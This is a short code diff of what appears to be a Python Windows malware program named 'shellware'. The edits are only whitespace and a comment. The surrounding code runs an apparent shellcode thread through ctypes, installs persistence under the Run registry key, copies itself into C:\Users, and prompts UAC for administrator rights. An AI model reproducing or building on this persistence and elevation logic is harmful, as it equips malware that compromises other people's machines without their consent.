@@ -100,7 +100,7 @@ def execute():
 	ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
 	
 def main():
-	
+		
 	dir = "C:\\Users\\"
 	fileName = sys.argv[0]
 	run = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
@@ -108,12 +108,13 @@ def main():
 	execute()
 
 
-	
+# Check to see if we're already copied to C:\Users, if so, we're going to assume
+# registry entry for persistence and copy to dir were succesful and not prompt UAC.
 if os.path.isfile("C:\Users\shellware.exe"):
 	pass
 else:
 	if not shell.IsUserAnAdmin():
-		#Prompt UAC 
+		# Prompt UAC 
 		ASADMIN = "asadmin"
 
 		if sys.argv[-1] != ASADMIN:
